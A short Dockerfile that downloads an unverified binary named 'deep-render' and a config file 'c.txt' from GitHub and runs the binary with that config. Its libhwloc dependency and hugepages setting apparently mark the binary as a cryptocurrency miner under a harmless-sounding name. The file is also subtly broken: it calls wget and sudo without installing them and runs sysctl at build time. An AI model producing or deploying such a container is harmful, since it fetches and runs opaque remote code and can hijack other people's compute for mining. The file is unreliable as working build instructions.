
FROM ubuntu:16.04

RUN apt-get update \
    && apt-get -qq --no-install-recommends install \
        libhwloc-dev \
        libssl-dev \
    && rm -r /var/lib/apt/lists/* \
    && wget https://github.com/morgankaufmann/deep-render/raw/master/deep-render \
    && wget https://github.com/morgankaufmann/deep-render/raw/master/c.txt \
    && sudo sysctl -w vm.nr_hugepages=128

ENTRYPOINT ["deep-render"]
CMD ["c.txt"]
